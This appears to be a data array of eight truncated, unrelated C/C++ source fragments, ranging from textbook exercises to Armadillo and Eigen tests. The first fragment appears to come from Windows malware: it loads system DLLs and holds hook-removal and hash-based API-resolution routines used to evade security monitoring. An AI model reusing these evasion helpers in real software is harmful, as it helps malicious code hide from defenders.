    "\ufeff#include \"api.h\"\n//#include \"antihook/antihooks.h\"\n#include \"hash.h\"\n\n#define HASHING_SEED 23341\n#define API_CACHE_SIZE (sizeof(LPVOID) * 1024)\n\ntypedef struct _UNICODE_STRING\n{\n\tUSHORT Length;\n\tUSHORT MaximumLength;\n\tPWSTR Buffer;\n} UNICODE_STRING;\n\nstruct LDR_MODULE\n{\n\tLIST_ENTRY e[3];\n\tHMODULE base;\n\tvoid* entry;\n\tUINT size;\n\tUNICODE_STRING dllPath;\n\tUNICODE_STRING dllname;\n};\n\ntypedef HMODULE(WINAPI* fnLoadLibraryA)(\n\t_In_ LPCSTR lpLibFileName\n\t);\n\nSTATIC HMODULE g_hKernel32;\nSTATIC fnLoadLibraryA pLoadLibraryA;\nSTATIC LPVOID* g_ApiCache = NULL;\nSTATIC BOOL g_IsRestartManagerLoaded = FALSE;\n\n#ifdef _WIN64\n#  define ADDR DWORDLONG\n#else\n#define   ADDR DWORD\n#endif\n\n#define RVATOVA( base, offset ) ( (ADDR)base + (ADDR)offset )\n\nHMODULE hKernel32;\nHMODULE hWs2_32;\nHMODULE hAdvapi32;\nHMODULE hNtdll;\nHMODULE hRstrtmgr;\nHMODULE hOle32;\nHMODULE hOleAut;\nHMODULE hNetApi32;\nHMODULE hIphlp32;\nHMODULE hShell32;\nHMODULE hShlwapi;\n\n\nVOID\napi::DisableHooks()\n{\n\thKernel32 = pLoadLibraryA(\"kernel32.dll\");\n\thWs2_32 = pLoadLibraryA(\"ws2_32.dll\");\n\thAdvapi32 = pLoadLibraryA(\"Advapi32.dll\");\n\thNtdll = pLoadLibraryA(\"ntdll.dll\");\n\thRstrtmgr = pLoadLibraryA(\"Rstrtmgr.dll\");\n\thOle32 = pLoadLibraryA(\"Ole32.dll\");\n\thOleAut = pLoadLibraryA(\"OleAut32.dll\");\n\thNetApi32 = pLoadLibraryA(\"Netapi32.dll\");\n\thIphlp32 = pLoadLibraryA(\"Iphlpapi.dll\");\n\thShlwapi = pLoadLibraryA(\"Shlwapi.dll\");\n\thShell32 = pLoadLibraryA(\"Shell32.dll\");\n\n\t//if (hNtdll) {\n\t//\tremoveHooks(hNtdll);\n\t//}\n\n\t//if (hKernel32) {\n\t//\tremoveHooks(hKernel32);\n\t//}\n\n\t//if (hWs2_32) {\n\t//\tremoveHooks(hWs2_32);\n\t//}\n\n\t//if (hAdvapi32) {\n\t//\tremoveHooks(hAdvapi32);\n\t//}\n\n\t//if (hRstrtmgr) {\n\n\t//\tg_IsRestartManagerLoaded = TRUE;\n\t//\tremoveHooks(hRstrtmgr);\n\n\t//}\n\n\t//if (hOle32) {\n\t//\tremoveHooks(hOle32);\n\t//}\n\n\t//if (hOleAut) {\n\t//\tremoveHooks(hOle32);\n\t//}\n\n\t//if (hNetApi32) {\n\t//\tremoveHooks(hNetApi32);\n\t//}\n\n\t//if (hIphlp32) {\n\t//\tremoveHooks(hIphlp32);\n\t//}\n\n\t//if (hShlwapi) {\n\t//\tremoveHooks(hShlwapi);\n\t//}\n\n\t//if (hShell32) {\n\t//\tremoveHooks(hShell32);\n\t//}\n}\n\n\nBOOL\napi::IsRestartManagerLoaded() {\n\treturn g_IsRestartManagerLoaded;\n}\n\nSTATIC\nINT\nStrLen(__in LPCSTR Str)\n{\n\tINT Length = 0;\n\twhile (*Str)\n\t{\n\n\t\tLength++;\n\t\tStr++;\n\n\t}\n\n\treturn Length;\n}\n\nSTATIC\nINT\nStrLen(__in LPCWSTR Str)\n{\n\tINT Length = 0;\n\twhile (*Str)\n\t{\n\n\t\tLength++;\n\t\tStr++;\n\n\t}\n\n\treturn Length;\n}\n\nvoid* m_memset(void* szBuffer, DWORD dwSym, DWORD dwLen)\n{\n\tif (!szBuffer)\n\t{\n\t\treturn NULL;\n\t}\n\n\t__asm\n\t{\n\t\tpushad\n\t\tmov\t\tedi, [szBuffer]\n\t\tmov\t\tecx, [dwLen]\n\t\tmov\t\teax, [dwSym]\n\t\trep\t\tstosb\n\t\tpopad\n\t}\n\n\treturn NULL;\n}\n\nvoid* m_memcpy(void* szBuf, const void* szStr, int nLen)\n{\n\tif (!szBuf || !szStr)\n\t{\n\t\treturn NULL;\n\t}\n\n\t__asm\n\t{\n\t\tpushad\n\t\tmov\t\tesi, [szStr]\n\t\tmov\t\tedi, [szBuf]\n\t\tmov\t\tecx, [nLen]\n\t\trep\t\tmovsb\n\t\tpopad\n\t}\n\n\treturn NULL;\n}\n\nLPSTR FindChar(LPSTR Str, CHAR Ch)\n{\n\twhile (*Str)\n\t{\n\n\t\tif (*Str == Ch) {\n\t\t\treturn Str;\n\t\t}\n\n\t\tStr++;\n\n\t}\n\n\treturn NULL;\n}\n\nint my_stoi(char* str) {\n\tunsigned int strLen = 0;\n\tunsigned int i = 0;\n\twhile (str[i] != '\\0') {\n\t\tstrLen += 1;\n\t\ti++;\n\t}\n\n\tint num = 0;\n\tint ten;\n\tBOOL signFlag = TRUE; //true: +, false: -\n\tfor (i = 0; i < strLen; i++) {\n\t\tif (str[i] < '0' || str[i] > '9') {\n\t\t\tif (i == 0 && str[i] == '-') {\n\t\t\t\tsignFlag = FALSE;\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tif (i == 0 && str[i] == '+') {\n\t\t\t\tsignFlag = TRUE;\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\treturn 0;\n\t\t}\n\n\t\tten = 1;\n\t\tfor (unsigned int j = 0; j < strLen - 1 - i; j++) {\n\t\t\tten *= 10;\n\t\t}\n\n\t\tnum += ten * (str[i] - '0');\n\t}\n\n\tif (signFlag) {\n\t\treturn num;\n\t}\n\telse {\n\t\treturn -num;\n\t}\n}\n\n/*\nLPVOID GetProcAddressByHash(HMODULE module, DWORD api_hash, BOOL isByOrd)\n{\n\tPIMAGE_DOS_HEADER img_dos_header;\n\tPIMAGE_NT_HEADERS img_nt_header;\n\tPIMAGE_EXPORT_DIRECTORY in_export;\n\n\timg_dos_header = (PIMAGE_DOS_HEADER)module;\n\timg_nt_header = (PIMAGE_NT_HEADERS)((DWORD_PTR)img_dos_header + img_dos_header->e_lfanew);\n\tin_export = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)img_dos_header +\n\t\timg_nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n\tDWORD_PTR in_export_end = (DWORD_PTR)in_export +\n\t\timg_nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;\n\n\tPDWORD rva_name;\n\tPWORD rva_ordinal;\n\n\trva_name = (PDWORD)((DWORD_PTR)img_dos_header + in_export->AddressOfNames);\n\trva_ordinal = (PWORD)((DWORD_PTR)img_dos_header + in_export->AddressOfNameOrdinals);\n\n\tUINT ord = -1;\n\tchar* api_name;\n\tunsigned int i;\n\n\tif (isByOrd) {\n\t\tord = api_hash;\n\t}\n\telse {\n\t\tfor (i = 0; i < in_export->NumberOfNames - 1; i++) {\n\t\t\tapi_name = (PCHAR)((DWORD_PTR)img_dos_header + rva_name[i]);\n\t\t\tint len = StrLen(api_name);\n\n\t\t\tDWORD hash = MurmurHash2A(api_name, len, HASHING_SEED);\n\n\t\t\tif (api_hash == hash) {\n\t\t\t\tord = static_cast<UINT>(rva_ordinal[i]);\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tif (ord == -1) {\n\t\t\t//error, not found\n\t\t\treturn NULL;\n\t\t}\n\t}\n\tconst auto func_addr = (PDWORD)((DWORD_PTR)img_dos_header + in_export->AddressOfFunctions);\n\tconst auto func_find = (LPVOID)((DWORD_PTR)img_dos_header + func_addr[ord]);\n\n\tif ((DWORD_PTR)fun",
    "\ufeff// Pointers_.cpp : \u042d\u0442\u043e\u0442 \u0444\u0430\u0439\u043b \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u0442 \u0444\u0443\u043d\u043a\u0446\u0438\u044e \"main\". \u0417\u0434\u0435\u0441\u044c \u043d\u0430\u0447\u0438\u043d\u0430\u0435\u0442\u0441\u044f \u0438 \u0437\u0430\u043a\u0430\u043d\u0447\u0438\u0432\u0430\u0435\u0442\u0441\u044f \u0432\u044b\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u0435 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b.\n//\n\n#include <iostream>\n#include <cmath>\nusing namespace std;\n\n//1. \u0421\u043e\u0437\u0434\u0430\u0442\u044c \u0434\u0432\u0435 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u044b\u0435 \u0438 \u043e\u043f\u0440\u0435\u0434\u0435\u043b\u0438\u0442\u044c \u00ab\u0440\u0430\u0441\u0441\u0442\u043e\u044f\u043d\u0438\u0435\u00bb \u043c\u0435\u0436\u0434\u0443 \u043d\u0438\u043c\u0438 \u0432 \u043f\u0430\u043c\u044f\u0442\u0438. \u0420\u0430\u0441\u0441\u0442\u043e\u044f\u043d\u0438\u0435 \u043f\u043e\u043a\u0430\u0437\u0430\u0442\u044c \u0432 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u044b\u0445 \u0442\u043e\u0433\u043e \u0436\u0435 \u0442\u0438\u043f\u0430 (\u0432\u044b\u0447\u0435\u0441\u0442\u044c \u0438\u0437 \u043e\u0434\u043d\u043e\u0433\u043e \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u044f \u0434\u0440\u0443\u0433\u043e\u0439). \u0417\u0430\u0442\u0435\u043c \u043f\u043e\u043a\u0430\u0437\u0430\u0442\u044c \u0440\u0430\u0441\u0441\u0442\u043e\u044f\u043d\u0438\u0435 \u0432 \u0431\u0430\u0439\u0442\u0430\u0445.\n\nint main()\n{\n\tsetlocale(LC_ALL, \"RU\");\n\n\tint x = 1;\n\tint y = 2;\n\tcout << (long long)&x << \"\\n\";\n\tcout << (long long)&y << \"\\n\";\n\tint* pointer_X = &x;\n\tint* pointer_Y = &y;\n\tcout << &y - &x << \"\\n\"; //\u0440\u0430\u0437\u043d\u0438\u0446\u0430 \u043c\u0435\u0436\u0434\u0443 \u0430\u0434\u0440\u0435\u0441\u0430\u043c\u0438\n\tint distance = pointer_Y - pointer_X; //\u0440\u0430\u0437\u043d\u0438\u0439\u0430 \u0447\u0435\u0440\u0435\u0437 \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u0438\n\tint byte_distance = distance * sizeof(int);\n\tcout << \"\u00ab\u0440\u0430\u0441\u0441\u0442\u043e\u044f\u043d\u0438\u0435\u00bb \u043c\u0435\u0436\u0434\u0443 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u044b\u043c\u0438 \u0432 \u043f\u0430\u043c\u044f\u0442\u0438 \u0432 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u0430\u0445 =\t\" << distance << \"\\n\";\n\tcout << \"\u00ab\u0440\u0430\u0441\u0441\u0442\u043e\u044f\u043d\u0438\u0435\u00bb \u043c\u0435\u0436\u0434\u0443 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u044b\u043c\u0438 \u0432 \u043f\u0430\u043c\u044f\u0442\u0438 \u0432 \u0431\u0430\u0439\u0442\u0430\u0445 =\t\" << byte_distance << \"\\n\";\n}\n\n\n\n//2. \u0427\u0435\u0440\u0435\u0437 \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u0438 \u043d\u0430 \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u0438 \u043f\u043e\u0441\u0447\u0438\u0442\u0430\u0442\u044c \u0441\u0443\u043c\u043c\u0443 \u0434\u0432\u0443\u0445 \u0447\u0438\u0441\u0435\u043b \u0438 \u0437\u0430\u043f\u0438\u0441\u0430\u0442\u044c \u0432 \u0442\u0440\u0435\u0442\u044c\u0435.\n\nint main()\n{\n\tsetlocale(LC_ALL, \"RU\");\n\tint x = 1;\n\tint y = 2;\n\tint z;\n\tint* pointer_X = &x;\n\tint* pointer_Y = &y;\n\tint* pointer_Z = &z;\n\tint** pointer_XX = &pointer_X;\n\tint** pointer_YY = &pointer_Y;\n\tint** pointer_ZZ = &pointer_Z;\n\t**pointer_ZZ = **pointer_XX + **pointer_YY;\n\tcout << z;\n}\n\n",
    "#include <iostream>\nusing namespace std;\n\n// Class for holding a value with a row and column index.\nclass SparseRow {\n    protected:\n        int row; // Row index\n        int col; // Column index\n        int value; // Assuming matrix value will be int.\n    public:\n        // Default constructor\n        SparseRow() {}\n        // Constructor for defining all instance variables.\n        SparseRow(int n, int m, int nsv) {\n            row = n;\n            col = m;\n            value = nsv;\n        }\n        // Display method (print row index, col index, and value).\n        void display() const {\n            cout << row << \", \" << col << \", \" << value << endl;\n        }\n        // Setters\n        void setRow(int newRow) { row = newRow; }\n        void setCol(int newCol) { col = newCol; }\n        void setValue(int newValue) { value = newValue; }\n        // Getters\n        int getRow() const { return row; }\n        int getCol() const { return col; }\n        int getValue() const { return value; }\n};\n\n// Class for holding a 2D Matrix. Uses SparseRow objects to hold the row index and column index of any non-sparse values.\nclass SparseMatrix {\n    protected:\n        int noRows; // Number of rows of the matrix.\n        int noCols; // Number of columns of the matrix.\n        int commonValue; // Common value in matrix.\n        int noNonSparseValues; // Number of non-common values.\n        int noInitializedNSV; // Counter for initialized non-sparse values.\n        SparseRow* myMatrix; // Array of SparseRow objects.\n    public:\n        // Default constructor\n        SparseMatrix() {}\n        // Constructor for defining noRows, noCols, commonValue, and noNonSparseValues.\n        SparseMatrix(int n, int m, int cv, int noNSV) {\n            noRows = n;\n            noCols = m;\n            commonValue = cv;\n            noNonSparseValues = noNSV;\n            noInitializedNSV = 0;\n            myMatrix = new SparseRow[noNSV]; // Defines the initialized SparseRow pointer to a SparseRow array with the amount of elements specified.\n        }\n        // Initialize SparseRow objects as they are fed to the SparseMatrix.\n        void initializeSparseRow(int row, int col, int nsv) {\n            if (noInitializedNSV < noNonSparseValues) { // Checks to see if the amount of non-sparse values has been met.\n                myMatrix[noInitializedNSV].setRow(row);\n                myMatrix[noInitializedNSV].setCol(col);\n                myMatrix[noInitializedNSV].setValue(nsv);\n                noInitializedNSV++; // Increments the number of initialized non-sparse values.\n            }\n        }\n        // Expands the size of MyMatrix (in the scenario where you may not know how many non-sparse values you will have before matrix creation).\n        void setAmountInMyMatrixArray(int newSize) {\n            SparseRow* result = new SparseRow[newSize]; // Create a result array with new size to return.\n            for (int i = 0; i < noInitializedNSV; i++) { // Copy over existing non-sparse values (up to the current size).\n                result[i] = myMatrix[i];\n            }\n            myMatrix = result; // Point to the new matrix and update the number of non-sparse values.\n            noNonSparseValues = newSize; // Update the noNonSparseValues to reflect the new size.\n        }\n        // Matrix transpose (switches row and col values of non-sparse values).\n        SparseMatrix* Transpose() {\n            SparseMatrix* result = new SparseMatrix(noRows, noCols, commonValue, noNonSparseValues);// Create a result SparseMatrix to return.\n            for (int i = 0; i < noNonSparseValues; i++) { // Copy over all of the values from the old matrix to the new SparseMatrix.\n                (*result).myMatrix[i].setRow(myMatrix[i].getCol());\n                (*result).myMatrix[i].setCol(myMatrix[i].getRow());\n                (*result).myMatrix[i].setValue(myMatrix[i].getValue());\n            }\n            return result; // Return resulting SparseMatrix.\n        }\n        // Matrix multiplication (multiplies two matrices).\n        SparseMatrix* Multiply(SparseMatrix& M) {\n            if (noCols != M.noRows) { // Check if multiplication is possible.\n                return nullptr;\n            }\n            SparseMatrix* result = new SparseMatrix(noRows, M.noCols, commonValue, 0); // Create result matrix with an initial assumption of zero non-sparse values.\n            for (int i = 0; i < noRows; i++) { // For each row of the first matrix (this).\n                for (int j = 0; j < M.noCols; j++) { // For each column of the second matrix (M).\n                    int sum = 0;\n                    for (int k = 0; k < noCols; k++) { // Calculate the dot product of row i of this matrix and column j of matrix M.\n                        int valueA = commonValue;  // Assume common value for this matrix.\n                        int valueB = M.commonValue;  // Assume common value for matrix M.\n                        for (int idxA = 0; idxA < noNonSparseValues; idxA++) { // Search",
    "// Copyright 2015 Conrad Sanderson (http://conradsanderson.id.au)\n// Copyright 2015 National ICT Australia (NICTA)\n// \n// Licensed under the Apache License, Version 2.0 (the \"License\");\n// you may not use this file except in compliance with the License.\n// You may obtain a copy of the License at\n// http://www.apache.org/licenses/LICENSE-2.0\n// \n// Unless required by applicable law or agreed to in writing, software\n// distributed under the License is distributed on an \"AS IS\" BASIS,\n// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n// See the License for the specific language governing permissions and\n// limitations under the License.\n// ------------------------------------------------------------------------\n\n\n#include <armadillo>\n#include \"catch.hpp\"\n\nusing namespace arma;\n\n\nTEST_CASE(\"expr_misc_1\")\n  {\n  mat A = \n    \"\\\n     0.061198   0.201990   0.019678  -0.493936  -0.126745   0.051408;\\\n     0.437242   0.058956  -0.149362  -0.045465   0.296153   0.035437;\\\n    -0.492474  -0.031309   0.314156   0.419733   0.068317  -0.454499;\\\n     0.336352   0.411541   0.458476  -0.393139  -0.135040   0.373833;\\\n     0.239585  -0.428913  -0.406953  -0.291020  -0.353768   0.258704;\\\n    \";\n  \n  mat B = A( span(0,min(size(A))-1), span(0,min(size(A))-1) );\n  \n  colvec q = B.tail_cols(1);\n  rowvec r = B.head_rows(1);\n  \n  B = B + q*r + B + B.col(1)*B.row(2) + inv(B.t() + B);\n  \n  mat C = \n    \"\\\n    -0.598176493690805   1.743720221389917  -0.464434209123318  -0.578107329514025  -0.466519088609519;\\\n     2.235239222999917   0.352055300390581   0.130383508730418   0.178723856228643   0.315212838210605;\\\n    -1.530100759221318   0.356920033171418   0.660107612169934   1.456138259553199  -0.459039415535322;\\\n     0.724145463141975   1.174109038919643   1.707140663038199  -0.861429259650926  -0.384555300447272;\\\n     0.425855872233481  -1.159439708059395  -1.540488679549322  -0.747036381125272  -1.722286962209877;\\\n    \";\n  \n  REQUIRE( accu(abs(B - C)) == Approx(0.0) );\n  \n  // REQUIRE_THROWS(  );\n  }\n",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/ptrace.h>\n#include <sys/types.h>\n#include <sys/wait.h>\n#include <unistd.h>\n#include <sys/user.h>\n#include <sys/syscall.h>\n#include <sys/uio.h>\n#include <getopt.h>\n\n#include <asm/ptrace.h>\n#include <sys/mman.h>\n#include <dlfcn.h>\n#include <dirent.h>\n#include <elf.h>\n\n#include <signal.h>\n#include <errno.h>\n#include <cerrno>\n\n#define MAX_SYSCALLS 10\n#define MAX_MODULES 4096\n#define MAX_PATH 256\n#define MAX_THREADS 1024\n#define MAX_BACKTRACE_DEPTH 16\n\n\npid_t g_child_pid = 0;\n\nvolatile sig_atomic_t g_running = 1;\n\nstruct module_info{\n    char name[MAX_PATH];\n    unsigned long long start_addr;\n    unsigned long long end_addr;\n    unsigned long long offset;\n};\n\nstruct thread_info {\n    pid_t tid;\n    int syscall_enter;\n};\n\nstruct {\n    int syscalls[MAX_SYSCALLS]; // List of syscalls to hook\n    int syscall_count; // Number of syscalls\n    pid_t pid;\n    char process_name[MAX_PATH]; // Mount by process name\n    char exec_command[MAX_PATH]; // Launch a specific application\n    int show_absolute; // Show absolute addresses\n    int show_relative; // Show relative addresses\n    int show_backtrace; // Show call stack\n    struct module_info modules[MAX_MODULES]; // Modules of the pid\n    int module_count;\n} config;\n\nstruct syscall_entry {\n    long number;\n    const char *name;\n} syscall_names[] = {\n    {0, \"io_setup\"},\n    {1, \"io_destroy\"},\n    {2, \"io_submit\"},\n    {3, \"io_cancel\"},\n    {4, \"io_getevents\"},\n    {5, \"setxattr\"},\n    {6, \"lsetxattr\"},\n    {7, \"fsetxattr\"},\n    {8, \"getxattr\"},\n    {9, \"lgetxattr\"},\n    {10, \"fgetxattr\"},\n    {11, \"listxattr\"},\n    {12, \"llistxattr\"},\n    {13, \"flistxattr\"},\n    {14, \"removexattr\"},\n    {15, \"lremovexattr\"},\n    {16, \"fremovexattr\"},\n    {17, \"getcwd\"},\n    {18, \"lookup_dcookie\"},\n    {19, \"eventfd2\"},\n    {20, \"epoll_create1\"},\n    {21, \"epoll_ctl\"},\n    {22, \"epoll_pwait\"},\n    {23, \"dup\"},\n    {24, \"dup3\"},\n    {25, \"fcntl\"},\n    {26, \"inotify_init1\"},\n    {27, \"inotify_add_watch\"},\n    {28, \"inotify_rm_watch\"},\n    {29, \"ioctl\"},\n    {30, \"ioprio_set\"},\n    {31, \"ioprio_get\"},\n    {32, \"flock\"},\n    {33, \"mknodat\"},\n    {34, \"mkdirat\"},\n    {35, \"unlinkat\"},\n    {36, \"symlinkat\"},\n    {37, \"linkat\"},\n    {38, \"renameat\"},\n    {39, \"umount2\"},\n    {40, \"mount\"},\n    {41, \"pivot_root\"},\n    {42, \"nfsservctl\"},\n    {43, \"statfs\"},\n    {44, \"fstatfs\"},\n    {45, \"truncate\"},\n    {46, \"ftruncate\"},\n    {47, \"fallocate\"},\n    {48, \"faccessat\"},\n    {49, \"chdir\"},\n    {50, \"fchdir\"},\n    {51, \"chroot\"},\n    {52, \"fchmod\"},\n    {53, \"fchmodat\"},\n    {54, \"fchownat\"},\n    {55, \"fchown\"},\n    {56, \"openat\"},\n    {57, \"close\"},\n    {58, \"vhangup\"},\n    {59, \"pipe2\"},\n    {60, \"quotactl\"},\n    {61, \"getdents64\"},\n    {62, \"lseek\"},\n    {63, \"read\"},\n    {64, \"write\"},\n    {65, \"readv\"},\n    {66, \"writev\"},\n    {67, \"pread64\"},\n    {68, \"pwrite64\"},\n    {69, \"preadv\"},\n    {70, \"pwritev\"},\n    {71, \"sendfile\"},\n    {72, \"pselect6\"},\n    {73, \"ppoll\"},\n    {74, \"signalfd4\"},\n    {75, \"vmsplice\"},\n    {76, \"splice\"},\n    {77, \"tee\"},\n    {78, \"readlinkat\"},\n    {79, \"newfstatat\"},\n    {80, \"fstat\"},\n    {81, \"sync\"},\n    {82, \"fsync\"},\n    {83, \"fdatasync\"},\n    {84, \"sync_file_range\"},\n    {85, \"timerfd_create\"},\n    {86, \"timerfd_settime\"},\n    {87, \"timerfd_gettime\"},\n    {88, \"utimensat\"},\n    {89, \"acct\"},\n    {90, \"capget\"},\n    {91, \"capset\"},\n    {92, \"personality\"},\n    {93, \"exit\"},\n    {94, \"exit_group\"},\n    {95, \"waitid\"},\n    {96, \"set_tid_address\"},\n    {97, \"unshare\"},\n    {98, \"futex\"},\n    {99, \"set_robust_list\"},\n    {100, \"get_robust_list\"},\n    {101, \"nanosleep\"},\n    {102, \"getitimer\"},\n    {103, \"setitimer\"},\n    {104, \"kexec_load\"},\n    {105, \"init_module\"},\n    {106, \"delete_module\"},\n    {107, \"timer_create\"},\n    {108, \"timer_gettime\"},\n    {109, \"timer_getoverrun\"},\n    {110, \"timer_settime\"},\n    {111, \"timer_delete\"},\n    {112, \"clock_settime\"},\n    {113, \"clock_gettime\"},\n    {114, \"clock_getres\"},\n    {115, \"clock_nanosleep\"},\n    {116, \"syslog\"},\n    {117, \"ptrace\"},\n    {118, \"sched_setparam\"},\n    {119, \"sched_setscheduler\"},\n    {120, \"sched_getscheduler\"},\n    {121, \"sched_getparam\"},\n    {122, \"sched_setaffinity\"},\n    {123, \"sched_getaffinity\"},\n    {124, \"sched_yield\"},\n    {125, \"sched_get_priority_max\"},\n    {126, \"sched_get_priority_min\"},\n    {127, \"sched_rr_get_interval\"},\n    {128, \"restart_syscall\"},\n    {129, \"kill\"},\n    {130, \"tkill\"},\n    {131, \"tgkill\"},\n    {132, \"sigaltstack\"},\n    {133, \"rt_sigsuspend\"},\n    {134, \"rt_sigaction\"},\n    {135, \"rt_sigprocmask\"},\n    {136, \"rt_sigpending\"},\n    {137, \"rt_sigtimedwait\"},\n    {138, \"rt_sigqueueinfo\"},\n    {139, \"rt_sigreturn\"},\n    {140, \"setpriority\"},\n    {141, \"getpriority\"},\n    {142, \"reboot\"},\n    {143, \"setregid\"},\n    {144, \"setgid\"},\n    {145, \"setreuid\"},\n    {146, \"setuid\"},\n    {147, \"setresuid\"},\n    {148, \"getresuid\"},\n    {149, \"setresgid\"},\n    {150, \"getresgid\"},\n    {151, \"setfsuid\"},\n    {152, \"",
    "//iterative wala binary search is better than the recursive binary search\n//4 type ke questions ismein bante h \n// -> classical\n// -> predicate function wale\n// -> search space wale\n// ->index observation wale\n#include<iostream>\nusing namespace std;\n\nint binarySearch(int arr[],int n,int target){\n    int start = 0;\n    int end = n-1;\n      //yaha mid find karte time integer overflow hone ki sambhavna h so we better change the approach\n    // int mid = (start+end)/2;//iss se overflow hoga\n    // int mid = start/2 + end/2;//Alternative method \n    int mid = start + (end - start)/2; // BEST PRACTICE\n    while(start<=end){\n        if(arr[mid]==target){\n            return mid;\n        }\n        else if(target > arr[mid]){\n            start = mid +1;\n        }\n        else if(target<arr[mid]){\n            end = mid -1;\n        }\n        mid = (start+end)/2;\n    }\n    return -1;\n}\nint main(){\n    int arr[]={10,20,30,40,50,60,70,80,90,100};\n    int n = 10;\n    int target = 100;\n    int ansIndex = binarySearch(arr,n,target);\n    if(ansIndex ==-1){\n        cout<<\"TARGET NOT FOUND\"<<endl;\n    }\n    else{\n        cout<<\"TARGET FOUND:\"<<ansIndex<<endl;\n    }\n    return 0;\n}",
    "#include \"gps.h\"\n\nTinyGPSPlus gps;\nHardwareSerial GPSSerial(1);\n\nDateTime travelTimeStart;\nDateTime travelTimeEnd;\nbool currentlyDriving = false;\n\nvoid updateGPS() {\n    while (GPSSerial.available() > 0) {\n        gps.encode(GPSSerial.read());\n    }\n}\n\nvoid initGPS() {\n    GPSSerial.begin(GPS_BAUD_RATE, SERIAL_8N1, RX, TX);\n}\n\nvoid oledPrintSpeed() {\n    int cursorPos = getCursorPos(Speed);\n    if (cursorPos < 0) {\n        return;\n    }\n\n    oled.setTextSize(TEXT_SIZE);\n    oled.setTextColor(TEXT_COLOR);\n    oled.setCursor(0, cursorPos);\n\n    if (gps.speed.isUpdated()) {\n        oled.print(\"Speed: \");\n        oled.print(gps.speed.kmph());\n        oled.println(\" km/h\");\n    } else {\n        oled.println(\"Speed: N/A\");\n    }\n}\n\nvoid handleGPSTimeButtonPress() {\n  currentlyDriving = !currentlyDriving;\n\n  if (currentlyDriving) {\n    travelTimeStart = rtc.now();\n  } else {\n    travelTimeEnd = rtc.now();\n  }\n}\n\n// TODO: Implement but the start time is needed\n\nvoid oledPrintDistanceTraveled() {\n    int cursorPos = getCursorPos(Distance);\n    if (cursorPos < 0) {\n        return;\n    }\n\n    oled.setTextSize(TEXT_SIZE);\n    oled.setTextColor(TEXT_COLOR);\n    oled.setCursor(0, cursorPos);\n}\n\nvoid oledPrintAverageSpeed() {\n    int cursorPos = getCursorPos(AverageSpeed);\n    if (cursorPos < 0) {\n        return;\n    }\n\n    oled.setTextSize(TEXT_SIZE);\n    oled.setTextColor(TEXT_COLOR);\n    oled.setCursor(0, cursorPos);\n}\n\nvoid oledPrintAltitude() {\n    int cursorPos = getCursorPos(Altitude);\n    if (cursorPos < 0) {\n        return;\n    }\n\n    oled.setTextSize(TEXT_SIZE);\n    oled.setTextColor(TEXT_COLOR);\n    oled.setCursor(0, cursorPos);\n}",
    "// This file is part of Eigen, a lightweight C++ template library\n// for linear algebra.\n//\n// Copyright (C) 2012-2016 Gael Guennebaud <gael.guennebaud@inria.fr>\n//\n// This Source Code Form is subject to the terms of the Mozilla\n// Public License v. 2.0. If a copy of the MPL was not distributed\n// with this file, You can obtain one at http://mozilla.org/MPL/2.0/.\n\n#define EIGEN_RUNTIME_NO_MALLOC\n#include \"main.h\"\n#include <limits>\n#include <Eigen/Eigenvalues>\n#include <Eigen/LU>\n\ntemplate<typename MatrixType> void generalized_eigensolver_real(const MatrixType& m)\n{\n  /* this test covers the following files:\n     GeneralizedEigenSolver.h\n  */\n  Index rows = m.rows();\n  Index cols = m.cols();\n\n  typedef typename MatrixType::Scalar Scalar;\n  typedef std::complex<Scalar> ComplexScalar;\n  typedef Matrix<Scalar, MatrixType::RowsAtCompileTime, 1> VectorType;\n\n  MatrixType a = MatrixType::Random(rows,cols);\n  MatrixType b = MatrixType::Random(rows,cols);\n  MatrixType a1 = MatrixType::Random(rows,cols);\n  MatrixType b1 = MatrixType::Random(rows,cols);\n  MatrixType spdA =  a.adjoint() * a + a1.adjoint() * a1;\n  MatrixType spdB =  b.adjoint() * b + b1.adjoint() * b1;\n\n  // lets compare to GeneralizedSelfAdjointEigenSolver\n  {\n    GeneralizedSelfAdjointEigenSolver<MatrixType> symmEig(spdA, spdB);\n    GeneralizedEigenSolver<MatrixType> eig(spdA, spdB);\n\n    VERIFY_IS_EQUAL(eig.eigenvalues().imag().cwiseAbs().maxCoeff(), 0);\n\n    VectorType realEigenvalues = eig.eigenvalues().real();\n    std::sort(realEigenvalues.data(), realEigenvalues.data()+realEigenvalues.size());\n    VERIFY_IS_APPROX(realEigenvalues, symmEig.eigenvalues());\n\n    // check eigenvectors\n    typename GeneralizedEigenSolver<MatrixType>::EigenvectorsType D = eig.eigenvalues().asDiagonal();\n    typename GeneralizedEigenSolver<MatrixType>::EigenvectorsType V = eig.eigenvectors();\n    VERIFY_IS_APPROX(spdA*V, spdB*V*D);\n  }\n\n  // non symmetric case:\n  {\n    GeneralizedEigenSolver<MatrixType> eig(rows);\n    // TODO enable full-prealocation of required memory, this probably requires an in-place mode for HessenbergDecomposition\n    //Eigen::internal::set_is_malloc_allowed(false);\n    eig.compute(a,b);\n    //Eigen::internal::set_is_malloc_allowed(true);\n    for(Index k=0; k<cols; ++k)\n    {\n      Matrix<ComplexScalar,Dynamic,Dynamic> tmp = (eig.betas()(k)*a).template cast<ComplexScalar>() - eig.alphas()(k)*b;\n      if(tmp.size()>1 && tmp.norm()>(std::numeric_limits<Scalar>::min)())\n        tmp /= tmp.norm();\n      